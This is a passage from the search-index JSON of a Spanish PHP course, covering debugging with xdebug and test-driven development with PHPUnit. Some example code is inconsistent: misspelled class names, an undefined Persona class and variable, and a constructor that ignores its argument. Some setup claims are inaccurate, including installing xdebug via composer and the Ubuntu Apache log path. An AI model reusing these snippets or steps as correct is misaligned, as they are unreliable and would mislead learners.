resultado tiene forma de objeto. Para acceder, por ejemplo, al nombre de un cliente, escribimos algo como $registro-&gt;nombre. | . ",
    "url": "https://iescelia.org/docs/dwes/_site/php/interaccion-con-php.html#24-interacci%C3%B3n-entre-mariadb-y-php",
    "relUrl": "/php/interaccion-con-php.html#24-interacción-entre-mariadb-y-php"
  },"9": {
    "doc": "2.4 Interacción con la base de datos",
    "title": "2.4 Interacción con la base de datos",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/php/interaccion-con-php.html",
    "relUrl": "/php/interaccion-con-php.html"
  },"10": {
    "doc": "2.5 Depurando el código PHP con xdebug",
    "title": "2.5. Depurando el código PHP con xdebug",
    "content": ". | 2.5.1. Herramientas estándar de PHP para depuración | 2.5.2. xdebug | . Depurar el código PHP es, en principio, una tarea ardua, porque el programa se ejecuta en un servidor y nosotros solo podemos ver el resultado de esa ejecución en un cliente web. Esto significa que, si ocurre un error, nos lo encontraremos mucho después de que haya ocurrido. Es algo así como cuando la policía encuentra los restos de un crimen (el cadáver, algunas huellas y unos cuantos cristales rotos en la habitación) mucho después de que el asesinato haya ocurrido. Hay que ejercer de auténticos detectives para, a partir de esas pistas, tratar de recomponer qué es lo que ha podido suceder en el servidor que ha provocado ese error. PHP ofrece varias funciones estándar para ayudarnos en la depuración pero, como vamos a ver, son bastante primitivas y poco funcionales, aunque pueden servirte en casos sencillos. Cuando la cosa se complica y el origen del error es difícil de rastrear, tendremos que recurrir a métodos más elaborados. Ahí entra en juego xdebug, el depurador más extendido en PHP. 2.5.1. Herramientas estándar de PHP para depuración . Como te decía, el propio lenguaje te ofrece varias funciones estándar para depurar errores. Las dos más utilizadas son: . | echo(): La función de salida estándar de PHP también se usa con propósitos de depuración. De hecho, esto se ha hecho siempre en todos los lenguajes. Simplemente, si un fragmento de tu código PHP está fallando (una función, un método, un módulo o lo que sea), coloca unos cuantos echo() estratégicos para mostrar el valor de tus variables clave, las que pueden estar tomando valores incorrectos. Verás el resultado de esos echo() en tu navegador web y te puede proporcionar información valiosa sobre lo que puede estar sucediendo. | print_r(): La función echo() solo muestra variables simples, pero no objetos o arrays. Si necesitas mostrar el contenido de algo más complejo que una variable simple, puedes usar print_r(), que enviará el contenido de cualquier variable a la salida estándar, por lo que podrás verla en tu navegador web. | var_dump(): Esta función es como print_r(), pero muestra aún más información sobre tu variable, como su tamaño. | . Además de estas funciones, los archivos de registro (logs) de tu servidor pueden mostrarte información importante sobre el error que se haya podido producir. La ubicación de los archivos log es diferente según tu sistema operativo, por lo que tendrás que investigar un poco acerca de qué archivos consultar. En general, hay un montón de archivos log que tu sistema operativo podría estar produciendo, así que lo primero sería averiguar cómo se llaman los archivos de log que produce tu servidor web en concreto. Por ejemplo, Apache en Ubuntu Linux tiene su registro de errores en /var/log/httpd/error_log. Como es imposible proporcionarte una lista de todos los archivos de registro de todos los servidores web en todos los sistemas operativos, tendrás que bichear un poco por Internet para localizar el log de tu servidor en concreto. 2.5.2. xdebug . Todo eso está muy bien, pero tanto las funciones estándar de PHP como los archivos log del servidor nos proporcionan una imagen a posteriori de lo que ha sucedido en el servidor. Es decir, vemos lo que ha ocurrido cuando el programa ya ha finalizado su ejecución, lo que a menudo dificultad localizar los errores. Además, usar funciones como print_r() o var_dump() implica introducir líneas de código de depuración dentro de mi programa. Ese código de depuración, poco a poco, va dejando basura que a veces se nos olvida eliminar. Nada hace peor efecto ante los usuarios que una aplicación web que de pronto muestra la salida de un var_dump() en mitad de una de sus vistas. Bueno, sí: un error de ejecución de PHP hace todavía peor efecto. Por todo ello, sería estupendo poder depurar el código PHP como si se estuviera ejecutando en nuestra máquina, igual que con cualquier otro lenguaje de programación. Eso es posible gracias a xdebug. ¿Qué es xdebug? . xdebug es una extensión de PHP que permite al cliente y al servidor comunicarse mediante un protocolo especial para depurar el código que se ejecuta en el servidor. Es decir: nuestro código seguirá ejecutándose en el servidor, pero nuestro cliente (normalmente, nuestro editor de texto o nuestro IDE) podrá pedirle al servidor que lo ejecute paso a paso o que le comunique el valor de cualquier variable en ese momento. Cómo instalar xdebug . Como es una extensión, xdebug no viene de serie y necesita ser instalada en el servidor. La configuración más habitual del servidor web, es decir, un Apache bajo Linux (supondremos que es Debian o Ubuntu), necesita estos pasos para lograr la instalación de xdebug: . | Instalar php-dev, un paquete de herramientas de desarrollo para PHP: $ sudo apt install php-dev | Instalar xdebug a través de composer: $ composer install xdebug | Habilitar el módulo xdebug en nuestro servidor: $ sudo phpenmod xdebug | Reiniciar el servidor: $ sudo service apache2 restart | . Obviamente, estos pasos son diferentes en otros servidores y otros sistemas operativos, incluso en otros sistemas Linux. Es imposible mostrar aquí todas las configuraciones posibles de todos los sistemas, por lo que, nuevamente, tendrás que buscar cuál es la manera de instalar xdebug en tu servidor dependiendo de cuál sea tu configuración exacta. (Incluso es posible que tengas suerte y tu servidor ya tenga xdebug instalado) . Después de habilitar xdebug en tu servidor, puedes comprobar que está funcionando ejecutando phpinfo() en cualquier script o escribiendo $php -i en tu servidor. En ambos casos debería aparecer una sección dedicada a xdebug con información sobre la configuración de esta extensión. Cómo activar xdebug en mi IDE . Una vez instalada la extensión xdebug, llega el momento de usarla. xdebug puede integrarse prácticamente con cualquier IDE medianamente decente. Nosotros vamos a ver cómo integrarla con Visual Studio Code, que es probablemente el IDE más utilizado en la actualidad. Si utilizas otro entorno de desarrollo, tendrás que buscar por ahí cómo habilitar xdebug en tu IDE, pero los pasos serán bastante similares a estos: . | Instalar una extensión adecuada para la integración de xdebug con VS Code. La más utilizada es una llamada PHP Debug. | Editar el archivo .vscode/launch.json. Este archivo contiene la configuración de debugging, es decir, la conexión con el componente xdebug de nuestro servidor. El archivo se crea automáticamente al instalar la extensión PHP Debug en VS Code, pero puede que tengas que cambiar algunas cosas. En concreto, tendrás que revisar: . | El puerto en el que está escuchando el servidor. La depuración de PHP se hace a través de un protocolo diferente de http/https, así que usa unos puertos diferentes. Un puerto habitual es el 9003, pero debes revisar la configuración de tu servidor por si está usando un puerto diferente, y en tal caso indicarlo en el archivo launch.json (sección port). | El directorio del servidor donde está tu aplicación web instalada. Los archivos del servidor se mapearán con archivos locales de VS Code. En la sección pathMappings del archivo launch.json debes indicar dónde están los archivos dentro del servidor. | . | . Cómo usar xdebug . Si ya tenemos instalado xdebug en el servidor y lo hemos activado correctamente en nuestro IDE o en nuestro editor de texto preferido, el proceso de depuración es bastante parecido al de cualquier otro lenguaje de programación. Nuevamente, nos referiremos a VS Code, pero el funcionamiento de xdebug será muy semejante en otros entornos de desarrollo. | Al ejecutar el código, VS Code nos mostrará las opciones para avanzar paso a paso, entrar dentro de funciones, saltar la ejecución de una función, continuar la ejecución sin parar o detener el programa. | Podemos crear puntos de ruptura o breakpoints haciendo click a la izquierda de la línea de código donde queremos detener la ejecución de la aplicación. | Podemos visualizar el valor de cualquier variable en ese instante poniendo el ratón encima de la variable en el propio código fuente. | En el panel izquierdo, podemos acceder a las variables del programa (tanto locales como globales y superglobales) y definir cualquier expresión que queramos que se vaya evaluando en tiempo real (watches). | . Además de estas funciones comunes de depuración, xdebug ofrece muchas funciones avanzadas que nosotros no vamos a ver, pero que puede que te interese usar en el futuro. Por ejemplo, puedes crear diferentes configuraciones de la sesión de debugging en el archivo launch.json para depurar diferentes aplicaciones (no es lo mismo depurar una aplicación web que una aplicación de línea de comandos). Otra función muy interesante de xdebug es la posibilidad de hacer profiling, es decir, un análisis del rendimiento de la aplicación web para detectar posibles problemas de rendimiento o cuellos de botella. Si quieres ampliar la información sobre xdebug, aquí tienes la documentación oficial. ",
    "url": "https://iescelia.org/docs/dwes/_site/php/depuracion-php-xdebug.html#25-depurando-el-c%C3%B3digo-php-con-xdebug",
    "relUrl": "/php/depuracion-php-xdebug.html#25-depurando-el-código-php-con-xdebug"
  },"11": {
    "doc": "2.5 Depurando el código PHP con xdebug",
    "title": "2.5 Depurando el código PHP con xdebug",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/php/depuracion-php-xdebug.html",
    "relUrl": "/php/depuracion-php-xdebug.html"
  },"12": {
    "doc": "2.6 TDD (test-driven development)",
    "title": "2.6. TDD: test-driven development",
    "content": ". | 2.6.1. Ventajas de hacer testing automático | 2.6.2. Tipos de pruebas | 2.6.3. ¿Qué es TDD? | 2.6.4. Implantar TDD en un proyecto PHP con PHP Unit | . El testing o fase de pruebas es una de las grandes olvidadas en los cursos de programación y este ciclo formativo no es una excepción. Realmente, parece que nunca hubiera tiempo para dedicarse a probar el software como es debido. Vamos a dedicar este apartado al testing y vamos a ver algunas técnicas que nos ayudarán a interiorizarlo y a integrarlo como parte de nuestra práctica profesional. En particular, nos vamos a centrar en el TDD o test-driven development, una metodología de desarrollo que toma las pruebas del software como la piedra angular del proceso de desarrollo y que, por lo tanto, permite construir aplicaciones en cualquier lenguaje que resultan mucho más confiables que las que se prueban a salto de mata. 2.6.1. Ventajas de hacer testing automático . Imagina que estás desarrollando una aplicación web que tiene multitud de funcionalidades. A ti te han encargado dos: hacer la pantalla de login y el mantenimiento de los usuarios registrados (altas, bajas, modificaciones, esas cosas). Puede que decidas que empezar por la pantalla de login está bien, así que comienzas a desarrollarla y te centras en todas sus funcionalidades: comprobar que el usuario y la contraseña son correctas, prevenir los posibles ataques, informar al usuario de posibles errores, habilitar un mecanismo para resetear la contraseña en caso de olvido, etc. Cuando terminas, ¿que haces? Lo pruebas todo manualmente una y otra vez. De hecho, lo habrás estado probando mientras lo desarrollabas. Las pruebas manuales están bien, y es conveniente hacerlas, pero no son suficiente. Siempre hay posibilidades que se nos pasan por alto y olvidamos probar. ¿Cuántas veces no has enseñado un programa a un compañero o a tu profesor después de haberlo usado mil veces y te ha fallado a los dos segundos porque han hecho algo que a ti no se te había ocurrido comprobar? . Por lo tanto, aquí tenemos la primera ventaja de hacer un testing: el testing bien diseñado siempre detectará más fallos que las pruebas manuales, además de consumir mucho menos tiempo por nuestra parte. Sigamos imaginando. Cuando terminas la pantalla de login, comienzas a desarrollar tu segunda tarea, es decir, el mantenimiento de usuarios. Te centras durante varios días en este nuevo subprograma y todas sus funciones: insertar, modificar y borrar usuarios, validar campos, impedir repeticiones, prevenir ataques, etc. Cuando terminas, no puedes estar seguro de si algo de lo que has hecho ha podido afectar a la pantalla de login. Por ejemplo, has podido añadir un nuevo campo que te hacía falta a la tabla de usuarios, y eso puede afectar a cómo se comporta el login. Conclusión: ¡tienes que volver a probar el login de nuevo! . Con un testing automatizado y bien diseñado, esto no es necesario, y aquí viene la segunda gran ventaja: siempre estaremos seguros de que toda la aplicación funciona, aunque vayamos añadiendo módulos y funcionalidades. En resumen, hacer un buen testing nos asegura que estamos produciendo código de calidad y libre de errores. No libre de errores al 100%, porque eso no existe, pero sí de buena calidad. Y eso no solo dice mucho de nuestra profesionalidad, sino que te dará una tranquilidad a la hora de presentar tus proyectos a tus clientes o a tus jefes (¡o a tus profesores!) que te aseguro que no tiene precio. La metodología TDD es útil cuando trabajas con proyectos grandes. Para proyectos pequeños, suele dar buenos resultados hacer un testing más o menos manual. Pero si trabajas así en un proyecto grande, notarás que al principio desarrollas muy deprisa pero, al cabo de unas semanas o unos meses, pasas más tiempo reparando cosas que no funcionan de tu código antiguo que desarrollando código y funcionalidades nuevas. Esta es la prueba más clara de que ese proyecto habria necesitado de un proceso de testing mucho más estricto. Estos proyectos suelen acabar abandonados porque se vuelven imposibles de mantener. En las primeras fases de desarrollo de un proyecto grande, puede parecerte que usar TDD es una pérdida de tiempo. Pero ese tiempo se recupera con creces más adelante, cuando podemos seguir avanzando al mismo ritmo que al principio porque tenemos la seguridad de que todo sigue funcionando. Y así llegamos a la última gran ventaja de seguir una metodología que automatice el testing: los programadores que trabajan de este modo y están acostumbrados a producir código de calidad ganan más dinero que los programadores chapuceros que prueban sus aplicaciones manualmente. Y lo hacen porque, a la larga, resultan mucho más productivos para su empresa. Así que la decisión es tuya: ¿quieres ser un programador/a que genere código de calidad o te conformas con ser un programador/a chapucero? . 2.6.2. Tipos de pruebas . La fase de pruebas de cualquier programa incluye diferentes tipos de prueba. Este no es un manual teórico sobre ingeniería del software (¡Dios nos libre!), pero necesitas conocer al menos estos tres tipos de prueba para entender cómo actúa la metodología TDD sobre el flujo de trabajo en un proyecto: . | Test unitario: estas pruebas se dedican a comprobar que una funcionalidad muy concreta responde correctamente. Por ejemplo, imagina que en tu pantalla de login quieres exigir al usuario que el campo email tenga formato de una dirección de correo bien escrita, así que escribes el código necesario para hacer esa comprobación. Pues bien, cuando compruebas si esa comprobación está funcionando o no, estás haciendo un test unitario. | Test de integración: estas pruebas comprueban el funcionamiento de varias funcionalidades o varios componentes trabajando en conjunto. Por ejemplo, cuando has terminado de escribir toda tu pantalla de login y quieres comprobar que todo funciona, estás haciendo un test de integración. Ahí están en juego no solo las distintas funciones que has programado (comprobación del email, comprobación de la contraseña, consulta a la base de datos, etc), sino varios componentes de la aplicación: javascript en el lado del cliente, una conexión con el servidor, tal vez un enrutador, etc. | Test de aceptación: estas pruebas son parecidas a las de integración, pero aún más amplias, implicando a componentes dispersos que previamente habrás probado mediante test de integración y, en última instancia, a toda la aplicación en su conjunto. Es el test que se hace antes de poner la aplicación en producción o de hacer una demo ante un cliente. | . 2.6.3. ¿Qué es TDD? . La metodología TDD o test-driven development es diferente del testing o fase de pruebas. TDD es una metodología de desarrollo, es decir, una manera de trabajar en el desarrollo de un proyecto software, con la peculiaridad de que la metodología TDD implica que el testing va a estar presente a lo largo de todo el desarrollo. Es decir, que puedes hacer testing sin metodología TDD, pero si trabajas con la metodología TDD, es seguro que vas a estar haciendo testing todo el tiempo. De hecho, cuando usas TDD, no escribes ni una sola línea de código sin haber diseñado antes las pruebas para ese código. El testing así, en general, puede hacerse en cualquier momento del desarollo, pero si usas TDD estarás haciendo testing de forma continua. Flujo de trabajo con TDD . Desarrollar cualquier parte de tu aplicación con TDD implica seguir siempre este orden: . | FASE ROJA: Consiste en diseñar las pruebas unitarias o de integración de lo que sea que vamos a desarrollar a continuación. Se llama fase roja porque estas pruebas siempre fallarán (y los errores, por aquello de que es un color muy llamativo, siempre se muestran en color rojo), ya que el código aún no está escrito. | FASE VERDE: Consiste en escribir el código necesario para que las pruebas dejen de fallar, sin preocuparnos de si está muy bien escrito o no. Lo importante aquí es convertir esos errores en rojo en mensajes en verde. | REFACTORIZACIÓN: Consiste en arreglar el código anterior para dejarlo bien legible y siguiendo las directrices de nuestra empresa o de nuestro grupo de trabajo en cuanto a calidad. Las pruebas, por supuesto, deben seguir dando un resultado verde, es decir, el código quedará vestido de domingo y seguirá sin fallar. | . Unit Tests are FIRST . Los test unitarios pueden hacerse en cualquier momento del desarrollo, pero la metodología TDD aboga por hacerlos ANTES de escribir el código de las clases. “Unit Tests are FIRST” no es solo una frase para recordarnos la conveniencia de diseñar los tests antes de escribir el código, sino que la palabra FIRST es un acrónimo de las características que deben tener esos tests según la metodología TDD: . | Fast (rápido): el número de tests puede llegar a ser considerable. Si no se ejecutan con rapidez, cada vez que pasemos la batería de tests podemos tener que esperar un buen rato. | Isolated (aislado): debemos diseñar cada test para que sea independiente de factores externos y también de los otros tests. Un cambio en uno de los tests no debería afectar al resto. | Repeateable (repetible): los tests siempre deben ofrecer los mismos resultados ante los mismos datos de prueba. | Selfverifying (autoverificable): los tests bien hechos solo pueden ofrecer dos resultados: o son un éxito o fallan. No deben quedar a la interpretación del desarrollador. | Timely (oportuno): los tests deben escribirse antes que el código que se pretende verificar. Eso, que puede resultado antiintuitivo al principio, hace que tengamos mucho más claro qué comportamiento debe tener el código que vamos a escribir. | . 2.6.4. Implantar TDD en un proyecto PHP con PHP Unit . Vamos a ver cómo usar PHP Unit para automatizar las pruebas unitarias de nuestras aplicaciones. Y lo vamos a hacer mediante un ejemplo. Supongamos que una determinada funcionalidad de nuestra aplicación tiene el cometido de comprobar que el campo email de un formulario no está vacío y tiene formato de email (es decir, una @ y al menos un punto). En caso contrario, debe mostrar un mensaje de error. Podríamos escribir ese código más o menos así: . $email = $_REQUEST[\"email\"]; if ($email == \"\") { echo \"Error: email incorrecto\"; } if (!filter_var($email, FILTER_VALIDATE_EMAIL)) { echo \"Error: email incorrecto\"; } . Este ejemplo tan simple será el código con el que trabajaremos para comprender cómo se usa PHPUnit. Instalar y preparar PHPUnit . PHPunit, como cualquier paquete adicional para PHP, puede instalarse manualmente o, mejor, con composer. Ya hablamos de cómo funciona este gestor de dependencias en el apartado 2.2.5, así que vuelve a leerlo si no lo recuerdas. Configuraremos composer.json de este modo: . { \"autoload\": { \"psr-4\": {\"Application\\\\\": \"src/\"} }, \"require-dev\": { \"phpunit/phpunit\": \"^9.5\", \"phpunit/php-code-coverage\": \"^9.2\" } } . De este modo, le estamos indicando a composer que cargue automáticamente las clases que encuentre en la carpeta /src, que es donde deben estar los fuentes de tu aplicación (si no están ahí, cambia el archivo de configuración) y que las asigne al espacio de nombres (namespace) “Application”. También estamos declarando las dependencias de phpunit para que los paquetes necesarios se instalen en la carpeta /vendor, de manera que tengamos PHPUnit disponible durante el desarrollo. Para lanzar la instalación de esos paquetes y la autocarga de las clases de la aplicación, ahora tienes que teclear estos comandos: . $ composer install $ composer dump-autoload . Casos de prueba de PHPUnit . Los casos de prueba son clases que contienen el código necesario para probar otras clases. Estos casos de prueba se suelen organizar del mismo modo que las clases reales. La costumbre es tener una carpeta llamada tests y, dentro de ella, reproducir la jerarquía de clases de todo el programa. Además, existen una serie de convenciones de nombres que debemos respetar: . | Si una clase de la aplicación se llama MiClase, el caso de prueba de esa clase debe llamarse MiClaseTest. | Los casos de prueba deben heredar de PHPUnit/Framework/TestCase. | Los tests que haya dentro de los casos de prueba deben ser métodos públicos, sin parámetros y contener el texto test en su nombre. | Todos los tests deben comportarse como afirmaciones. Pueden ser como la función assertTrue() del ejemplo anterior. En ese caso, estaríamos afirmando que cierta condición es true y, en otro caso, el test fallará. O pueden ser afirmaciones de tipo assertEquals() (el valor de algo es igual a cierto valor esperado o, si no, el test fallará), assertContains() (cierta estructura de datos contiene determinado valor; si no, el test fallará), assertCount() (una estructura de datos contiene un cierto número de elementos; si no es así, el test fallará), etc. PHPunit tiene predefinidas un enorme número de afirmaciones como estas. | Los tests se lanzan desde la línea de comandos. Lo más cómodo es usar la consola integrada dentro de Visual Studio Code (o del editor que estés usando, si dispone de esta funcionalidad). Si no, siempre puedes abrir un terminal de texto en tu sistema operativo y moverte hasta la carpeta de tu proyecto. | . Escribiendo mi primer caso de prueba . Aunque es posible llamar a una sola clase de prueba, lo habitual es lanzar la batería completa de tests de un directorio concreto. En nuestro ejemplo no habrá diferencias porque, como es un ejemplo pequeñito, solo tendremos una clase (que llamaremos CheckFormLogin) y su correspondiente caso de prueba (CheckFormLoginTest). Esta clase contendrá las comprobaciones necesarias para saber si un formulario de login de una aplicación web ha sido cumplimentado correctamente. El código de CheckFormLogin debe estar, como el resto de la aplicación, en la carpeta /src (u la carpeta que hayamos preferido, siempre que se lo indiquemos a PHPUnit en composer.json): . namespace Application; class CheckFormLogin { private $status; // Estado de la comprobación de errores. Si vale 0, es que no hay ningún error. private $email; // Campos del formulario. Solo trabajaremos con el email, pero se pueden añadir más. /* Constructor. Pone el status a 0, que significa que no se ha detectado ningún error en el formulario. */ function __construct($email) { $this-&gt;status = 0; } /* Comprueba si el campo email está correctamente escrito. Pone el status a 1 si el email está vacío y a 2 si el email no está correctamente formado. Devuelve el valor del status */ function checkEmail() { if ($this-&gt;email == \"\") { $this-&gt;status = 1; } if (!filter_var($this-&gt;email, FILTER_VALIDATE_EMAIL)) { $this-&gt;status = 2; } return $this-&gt;status; } /* Getter y setter para el atributo email */ function getEmail() { return $this-&gt;email; } function setEmail($email) { $this-&gt;email = $email; return $this-&gt;email; } } . Por supuesto, esta clase puede contener otros atributos y otros métodos para comprobar que otros campos de un formulario de login se han rellenado correctamente, pero para nuestro ejemplo solo usaremos $email y checkEmail(). Necesitamos ahora escribir, en la carpeta /test, el caso de prueba correspondiente a la clase anterior: . namespace Test; use PHPUnit\\Framework\\TestCase; use Application\\CheckFormLogin; class ChecCheckFormLoginTest extends TestCase { public function testEmailIsEmpty() { $checkLogin = new CheckFromLogin(); $checkLogin-&gt;setEmail(\"\"); // Probamos un email vacío $status = $checkLogin-&gt;checkEmail(); $this-&gt;assertEquals($status, 1); } public function testEmailBadFormat() { $checkLogin = new CheckFromLogin(); $checkLogin-&gt;setEmail(\"blablabla\"); // Probamos un email mal formateado $status = $checkLogin-&gt;checkEmail(); $this-&gt;assertEquals($status, 2); } } . Lo que hemos hecho en el caso de prueba es testear que la clase que estamos probando, CheckFormLogin, se comporta como debe en cada situación. Por ejemplo, el primer método, testEmailIsEmpty(), comprueba qué pasa cuando la clase CheckFormLogin recibe como email una cadena vacía (el atributo status debería pasar a valer 1, y eso es lo que comprobamos). El otro método, testEmailBadFormat(), comprueba qué sucede si la clase CheckFormLogin recibe un email mal formateado, sin arrobas ni puntos (el status debería valer 2). Por supuesto, se pueden añadir otras comprobaciones, como el caso de un email correctamente escrito (el status debería valer 0). Se hace fácil ver que construir los casos de prueba es un trabajo bastante costoso y que, en más de una ocasión, requerirá más líneas de código que la propia aplicación. Ejecutando los tests . Ya tenemos nuestro primer caso de prueba escrito para una de las clases de nuestra aplicación. Ha llegado el momento de lanzar el test. Para eso, nos salimos a la consola de texto (recuerda: si lo haces desde dentro del propio Visual Studio Code, todo resultará más fácil) y escribimos: . $ ./vendor/bin/phpunit --colors test . Así ejecutaremos phpunit (que está dentro de la carpeta /vendor, como todos los paquetes de terceros) y lanzamos el test de colores (lo mencionamos al principio: fase roja, fase verde y refactorización. Por eso se llama “test de colores”). PHPUnit lanzará todos los tests que encuentre y nos mostrará una pantalla de resultados, marcando en rojo los tests que hayan fallado, es decir, las afirmaciones o assets que no se hayan cumplido. Si pasamos los tests regularmente a toda la aplicación, podemos ir haciendo crecer nuestro código sin miedo a que los nuevos fragmentos de código rompan algo de lo que ya habíamos probado antes. Fixtures . Casi todos los métodos de los casos de prueba siguen el mismo patrón: . | Preparamos la clase que queremos probar (en nuestro ejemplo anterior, CheckFormLogin), creando un objeto de esa clase con los valores que correspondan. | Se lanza la acción que queremos probar (en nuestro ejemplo, checkEmail()) | Se realiza una afirmación sobre el resultado de la acción anterior (en nuestro ejemplo, que el status valga 1 o 2). | . Hay ciertas partes de ese patrón que se repetirán una y otra vez en todos los métodos del caso de prueba. Para evitar ese copy-paste, que siempre es una pésima práctica de programación, existen las fixtures o características fijas que se repiten en todos los tests. Incluso en el ejemplo anterior, que es muy simple, podemos observar una característica fija: todos los tests empiezan crando un objeto de tipo CheckFormLogin. Por supuesto, en tests más realistas y complejos podría haber bastante más código repetido. Pues bien, PHPUnit permite evitar la duplicación de ese código mediante dos métodos que se pueden añadir al caso de prueba: . | setUp() - El código que pongamos en este método se ejecutará ANTES que los tests. Suele usarse para crear objetos y configurarlos. | tearDown() - El código que escribamos aquí se ejecutar DESPUÉS de los tests, cuando todo haya terminado. Suele usarse para liberar la memoria o los recursos que hayan requerido los tests. | . En nuestro ejemplo anterior, podríamos añadir esos dos métodos así: . namespace Test; use PHPUnit\\Framework\\TestCase; use Application\\CheckFormLogin; class ChecCheckFormLoginTest extends TestCase { private $checkLogin; // Este será el objeto con el que haremos los tests protected function setUp() { $this-&gt;checkLogin = new CheckLoginForm(); } public function testEmailIsEmpty() { $this-&gt;checkLogin-&gt;setEmail(\"\"); // Probamos un email vacío $status = $this-&gt;checkLogin-&gt;checkEmail(); $this-&gt;assertEquals($status, 1); } public function testEmailBadFormat() { $this-&gt;checkLogin = new CheckFromLogin(); $this-&gt;checkLogin-&gt;setEmail(\"blablabla\"); // Probamos un email mal formateado $status = $this-&gt;checkLogin-&gt;checkEmail(); $this-&gt;assertEquals($status, 2); } protected function tearDown() { unset($this-&gt;checkLogin); } } . Como puedes ver, ya no repetimos la línea checkLogin = new CheckFormLogin() al principio de cada método, sino que ese código repetido se escribe una sola vez, en el método setUp(). Y usamos el método tearDown() para eliminar el objeto que hemos creado. Esto último no es obligatorio (si no lo hubiéramos hecho, el recolector de basura de PHP se hubiera encargado de ello), pero mantener la simetría entre los métodos de creación y destrucción se considera una buena práctica de programación. Como es lógico, en un caso más complejo que el de este ejemplo, tanto setUp() como tearDown() podrían tener mucho más trabajo que hacer. Dobles de prueba . A veces, no se puede probar bien una clase porque esta necesita otros componentes (por ejemplo, otras clases) que no se pueden usar, por ejemplo porque aún no están desarrollados o porque tienen efectos secundarios que afectarían a la propia prueba. ¡Los diferentes componentes de las aplicaciones no suelen ser completamente independientes, y eso es un engorro a la hora de plantear las pruebas! . Esto puede hacer que nuestros tests sean muy dependientes unos de otros y, como vimos más arriba, los tests deberían ser completamente independientes entre sí. Para solventar este problema existen los dobles de prueba, que se denominan así por los dobles de las películas de acción que sustituyen a los actores y actrices en las escenas peligrosas. Si el objeto que estamos probando necesita usar otro objeto diferente, podemos usar un doble de prueba en su lugar. Se comportará como un objeto real, pero no lo será. Por ejemplo, supón que estamos programando una aplicación para jugar al solitario con la baraja española, y que tenemos dos clases, una llamada Baraja y otra llamada Jugador. Son dos clases relacionadas entre sí: . class Baraja { private $cartas; public function __construct() { $this-&gt;cartas = array(\"1-oros\", \"2-oros\", \"3-oros\", ..., \"12-oros\", \"1-copas\", \"2-copas\", \"3-copas\", ... \"12-copas\", \"1-espadas\", \"2-espadas\", ..., \"12-espadas\", \"1-bastos\", \"2-bastos\", ..., \"12-bastos\"); } public function getCarta() { // Este método devuelve la siguiente carta de la baraja } public function getNumero($carta) { // Este método recibe una carta y devuelve solo su número } public function getPalo($carta) { // Este método recibe una carta y devuelve solo su palo } public function getAll() { // Este método nos devuelve todas las cartas que aún faltan por salir } public function getMonton() { // Este método nos devuelve todas las cartas que ya han salido } public function barajar() { // Este método baraja las cartas (las desordena al azar) } public function cartasDisponibles() { // Este método nos dice cuántas cartas quedan disponibles (sin salir) } public function reset() { // Este método vuelve a dejar la baraja en su estado inicial (ordenado) } } . class Jugador { private $nombre; // Nombre del jugador private $baraja; // Baraja con la que va a jugar este jugador private $puntos; // Puntos del jugador public function __construct($n) { $this-&gt;nombre = $n; $this-&gt;baraja = new Baraja(); $this-&gt;baraja-&gt;barajar(); } // Getter y setter del atributo $nombre public function getNombre(): string { return $this-&gt;nombre; } public function setNombre(string $n) { $this-&gt;nombre = $n; } // Getter y setter del atributo $baraja public function getBaraja(): Baraja { return $this-&gt;baraja; } public function setBaraja(Baraja $b) { $this-&gt;baraja = $b; } // Este método extrae las dos siguientes cartas de la baraja y las devuelve en un array. // Si no hay cartas disponibles, resetea la baraja antes de sacar las dos cartas. // Si el número de las dos cartas es igual, incrementa en 1 los puntos del jugador. public function sacarDosCartas() { if ($this-&gt;baraja-&gt;cartasDisponibles() &lt; 2) { $this-&gt;baraja-&gt;reset(); $this-&gt;baraja-&gt;barajar(); } $carta1 = $this-&gt;baraja-&gt;getCarta(); $carta2 = $this-&gt;baraja-&gt;getCarta(); if ($baraja-&gt;getNumero($carta1) == $baraja-&gt;getNumero($carta2)) { $this-&gt;puntos++; } return array($carta1, $carta2); } // Etc. (aquí irían los demás métodos de la clase) } . En este ejemplo, cuando creamos un objeto de tipo Jugador, también creamos, indirectamente, un objeto de tipo Baraja, puesto que uno de los atributos de Jugador es una Baraja y el objeto $this-&gt;baraja se crea en el constructor. Observa también cómo el método getBaraja() devuelve un objeto de tipo Baraja y setBaraja() recibe un objeto de ese mismo tipo para asignarlo al atributo $this-&gt;baraja. Más abajo, el método sacarDosCartas() hace un uso exhaustivo del objeto $this-&gt;baraja, fundamental para que la clase Jugador funcione bien. Pues bien, ¿qué pasa cuando queremos escribir los tests de la clase Jugador? Porque si los tests deben ser independientes unos de otros, el test de Jugador no debería verse afectado por lo que ocurra en la clase Baraja. Por ejemplo, podría suceder que la clase Baraja aún no esté implementada completamente, o que contenga errores porque no haya sido depurada. En esos casos, los tests de la clase Jugador fallarían, pero no por errores en Jugador, sino por errores aún no resueltos en Baraja, que no es el componente que estamos probando ahora. Dobles de prueba: stubs . Para solventar situación como la que acabamos de describir (que es muy habitual en sistemas complejos) se utilizan los dobles de prueba, que a veces se llaman stubs y a veces se llaman mocks. En concreto, necesitamos un doble de la clase Baraja que simule un comportamiento aceptable de esta clase para poder probar la clase Jugador, que es lo que ahora nos interesa. Puedes ver cómo se crean esos dobles en este caso de prueba de la clase Jugador, que llamaremos JugadorTest: . namespace Test; use PHPUnit\\Framework\\TestCase; use Application\\Jugador; class JugadorTest extends TestCase { private $jugador; private $baraja; protected function setUp() { $this-&gt;persona = new Persona(\"John Doe\"); $this-&gt;baraja = $this-&gt;createMock(\\Application\\Baraja::class); $this-&gt;persona-&gt;setBaraja($this-&gt;baraja); } // Aquí irían los métodos de los tests de la clase Jugador } . Observa con detenimiento el método setUp(). Verás que hemos construido un objeto Jugador (al que queremos hacer los tests) y también un objeto Baraja. Pero esa no es la clase que queremos probar, y por eso no creamos un objeto real, sino un doble de prueba. Eso se consigue con createMock(), un método de PHPUNit heredado de TestCase. Este método solo necesita que le pasemos el nombre de una clase (que se obtiene con la expresión \\Application\\Baraja::class) para crear el doble de prueba. Para Jugador, este será como un objeto Baraja real. De hecho, inmediatamente después se lo pasamos a setBaraja() para que el objeto Jugador lo asuma como su baraja de cartas. Pero el doble de prueba no es una Baraja de verdad, solo debe parecerlo y se debe comportar como si lo fuera. De modo que, en el test de Jugador, debemos especificar cuál debería ser un comportamiento apropiado con el único fin de testear la clase Jugador. La forma más simple de hacer esto sería forzando a que los métodos de Baraja devuelvan a Jugador un valor cualquiera, siempre que tenga sentido. Esto se hace cuando solo necesitamos que los métodos del doble nos devuelvan algo sin importar el valor concreto que, en realidad, no afecta al funcionamiento de la clase que 